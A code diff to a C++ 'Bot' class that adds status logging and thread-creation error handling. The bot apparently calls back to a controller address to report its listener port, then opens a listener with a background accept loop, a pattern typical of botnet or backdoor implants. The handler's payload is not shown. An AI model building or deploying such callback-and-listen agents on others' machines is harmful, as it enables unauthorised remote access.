@@ -5,6 +5,8 @@
 #include <string>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <iostream>
+#include <system_error>
 
 Bot::Bot(const sockaddr_in *cbaddr) {
     std::random_device rd;
@@ -31,8 +33,10 @@ int Bot::callback() {
     int sockfd;
     std::string port = std::to_string(m_listener_port);
 
+    std::cout << "INFO: Calling back to " << inet_ntoa(m_callback_addr.sin_addr) << ":" << ntohs(m_callback_addr.sin_port) << "\n";
     res = socket(AF_INET, SOCK_STREAM, 0);
     if (res == -1) {
+        std::cout << "FAIL: Failed to create callback socket\n";
         return -1;
     }
     sockfd = res;
@@ -40,30 +44,46 @@ int Bot::callback() {
     res = connect(sockfd, (sockaddr *)&m_callback_addr,
                   (socklen_t)sizeof(m_callback_addr));
     if (res == -1) {
+        std::cout << "FAIL: Failed to connect to callback listener\n";
         close(sockfd);
         return -1;
     }
 
     res = send(sockfd, port.c_str(), port.size(), 0);
     if (res == -1) {
+        std::cout << "FAIL: Failed to send listener port\n";
         close(sockfd);
         return -1;
     }
 
     res = close(sockfd);
+    std::cout << "SUCCESS: Called back\n";
     return 0;
 }
 
 int Bot::start_listener() {
     int res;
 
+    std::cout << "INFO: Creating Listener\n";
     res = create_listener();
     if (res == -1) {
+        std::cout << "FAIL: Failed to create listener\n";
         stop_listener();
         return -1;
     }
+    std::cout << "SUCCESS: Created listener\n";
     m_listener = res;
+    
 
+    std::cout << "INFO: Starting accept loop\n";
+    res = background_listener();
+    if (res == -1) {
+        std::cout << "FAIL: Failed to background thread\n";
+        stop_listener();
+        return -1;
+    }
+
+    std::cout << "SUCCESS: Backgrounded thread\n";
     return 0;
 }
 
@@ -81,7 +101,13 @@ int Bot::stop_listener() {
 }
 
 int Bot::background_listener() {
-    m_listener_thread = std::thread(&Bot::accept_loop, this);
+    try {
+        m_listener_thread = std::thread(&Bot::accept_loop, this);
+    } catch (const std::system_error& e) {
+        std::cout << "EXCEPTION: " << e.what() << "\n";
+        return -1;
+    }
+    
     return 0;
 }
 
